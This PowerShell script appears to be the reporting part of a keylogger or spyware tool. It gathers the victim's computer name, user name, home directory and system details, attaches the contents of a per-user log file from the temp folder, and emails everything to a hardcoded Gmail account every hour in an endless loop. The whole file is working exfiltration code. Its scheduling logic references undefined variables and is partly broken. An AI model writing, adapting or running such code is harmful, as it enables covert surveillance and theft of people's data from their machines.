
$Email = "username@gmail.com"
$Password = "password"

function sendMail($logFile="$env:temp\$env:username.log") {
    echo "Mail should be sent at $(Get-Date)" > "C:\Users\0xrand0m\development\PowerShell\testing$((Get-Date).Minute).log"
    $Subject = "You got mail from $env:USERNAME!"
    $Body = @"
                This email has been sent from $env:COMPUTERNAME
                -----------------------------------------------------------------
                Computer Name: $env:computername
                User Name: $env:username
                Home Directory: $env:userprofile
                Operating System: $env:OS
                Processor: $env:PROCESSOR_ARCHITECTURE $env:PROCESSOR_IDENTIFIER

"@
    if (Test-Path $logFile) {
        $Body += Get-Content -Path $logFile -Raw
    }
    $SMTPServer = "smtp.gmail.com"
    $SMTPClient = New-Object Net.Mail.SMTPClient($SMTPServer, 587)
    $SMTPClient.EnableSSL = $true
    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Email, $Password)
    echo $SMTPClient > "C:\Users\0xrand0m\development\PowerShell\smtp.log"
    $SMTPClient.Send($Email, $Email, $Subject, $Body)
}

function scheduleMail($MinutesInterval=60) {
        $now = Get-Date
        $SecondsInterval = $MinutesInterval * 60
        $nextInterval = $now.AddMinutes($Interval - ($now.Minute % $MinutesInterval))
        echo $TotalSeconds
        Start-Sleep -Seconds ($nextInterval - $now).TotalSeconds
        while ($true) {
            sendMail
            Start-Sleep -Seconds $SecondsInterval
        }
}

sendMail
scheduleMail